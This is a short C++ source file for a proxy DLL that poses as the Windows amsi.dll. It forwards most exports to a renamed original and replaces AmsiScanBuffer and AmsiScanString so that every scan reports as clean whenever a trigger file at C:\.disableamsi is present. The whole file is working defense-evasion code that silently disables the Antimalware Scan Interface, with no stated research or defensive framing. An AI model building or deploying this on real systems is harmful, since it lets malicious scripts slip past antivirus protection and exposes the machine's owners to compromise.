#pragma once

#pragma comment(linker,"/export:AmsiCloseSession=c:\\windows\\system32\\amsi_legit.AmsiCloseSession,@1")
#pragma comment(linker,"/export:AmsiInitialize=c:\\windows\\system32\\amsi_legit.AmsiInitialize,@2")
#pragma comment(linker,"/export:AmsiOpenSession=c:\\windows\\system32\\amsi_legit.AmsiOpenSession,@3")
// #pragma comment(linker,"/export:AmsiScanBuffer=c:\\windows\\system32\\amsi_legit.AmsiScanBuffer,@4")
// #pragma comment(linker,"/export:AmsiScanString=c:\\windows\\system32\\amsi_legit.AmsiScanString,@5")
#pragma comment(linker,"/export:AmsiUacInitialize=c:\\windows\\system32\\amsi_legit.AmsiUacInitialize,@6")
#pragma comment(linker,"/export:AmsiUacScan=c:\\windows\\system32\\amsi_legit.AmsiUacScan,@7")
#pragma comment(linker,"/export:AmsiUacUninitialize=c:\\windows\\system32\\amsi_legit.AmsiUacUninitialize,@8")
#pragma comment(linker,"/export:AmsiUninitialize=c:\\windows\\system32\\amsi_legit.AmsiUninitialize,@9")
#pragma comment(linker,"/export:DllCanUnloadNow=c:\\windows\\system32\\amsi_legit.DllCanUnloadNow,@10")
#pragma comment(linker,"/export:DllGetClassObject=c:\\windows\\system32\\amsi_legit.DllGetClassObject,@11")
#pragma comment(linker,"/export:DllRegisterServer=c:\\windows\\system32\\amsi_legit.DllRegisterServer,@12")
#pragma comment(linker,"/export:DllUnregisterServer=c:\\windows\\system32\\amsi_legit.DllUnregisterServer,@13")

#include "windows.h"
#include "ios"
#include "fstream"
#include "amsi.h"

typedef HRESULT(*AmsiScanBuffer_Type)(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result);
typedef HRESULT(*AmsiScanString_Type)(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result);

// Remove this line if you aren't proxying any functions.
HMODULE hModule = LoadLibrary(L"c:\\windows\\system32\\amsi_legit.dll");

LPCTSTR opFile = L"C:\\.disableamsi";

BOOL FileExists(LPCTSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

HRESULT AmsiScanBuffer_Proxy(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)
{
    if ( !FileExists(opFile) ) {
        AmsiScanBuffer_Type original = (AmsiScanBuffer_Type)GetProcAddress(hModule, "AmsiScanBuffer");
        return original(amsiContext, buffer, length, contentName, amsiSession, result);
    }
    else {
        *result = AMSI_RESULT_CLEAN;
        return S_OK;
    }
}
HRESULT AmsiScanString_Proxy(HAMSICONTEXT amsiContext, LPCWSTR string, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result)
{
    if ( !FileExists(opFile) ) {
        AmsiScanString_Type original = (AmsiScanString_Type)GetProcAddress(hModule, "AmsiScanString");
        return original(amsiContext, string, contentName, amsiSession, result);
    }
    else {
        *result = AMSI_RESULT_CLEAN;
        return S_OK;
    }
}